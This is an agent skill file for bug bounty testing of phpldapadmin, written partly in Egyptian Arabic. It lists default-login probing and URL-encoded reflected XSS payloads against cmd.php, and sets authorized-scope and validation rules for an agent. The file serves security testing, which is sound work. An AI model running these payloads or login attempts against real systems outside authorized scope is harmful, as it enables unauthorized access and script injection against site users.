# SKILL: phpldapadmin: ديفولت لوجن + XSS معروفة في cmd.php

**Skill id:** `tip/phpldapadmin-ديفولت-لوجن-xss-معروفة-في-cmdphp`  
**Category:** XSS, Recon  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/3dddac31e8808129a572d8fffac3771c  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **XSS, Recon**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

phpldapadmin ليه default panel معروفة بتفتح المواقع بدون تأمين كويس ودايمًا بتكون فيها ثغرات XSS معروفة في ملف cmd.php.

## Payload / Code

```
1) ضيف للـ wordlist:
phpldapadmin/index.php → جرّب default login

2) لو مفيش حظ، جرّب الـ XSS دول:
domain/phpldapadmin/cmd.php
domain/cmd.php

3) الـ payloads:
cmd.php?cmd=template\_engine&dn=%27%22()%26%25%3Czzz%3E%3CScRiPt%20%3Ealert(%27Orwa%27)%3C/ScRiPt%3E&meth=ajax&server\_id=1
cmd.php?server\_id=\alert('Orwa')\

ممكن كمان تبدل cmd.php بـ index.php وتجرّب تاني
```

## Source

kjulius @ethical\_h4ck3r\_ — Credit: @GodfatherOrwa

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
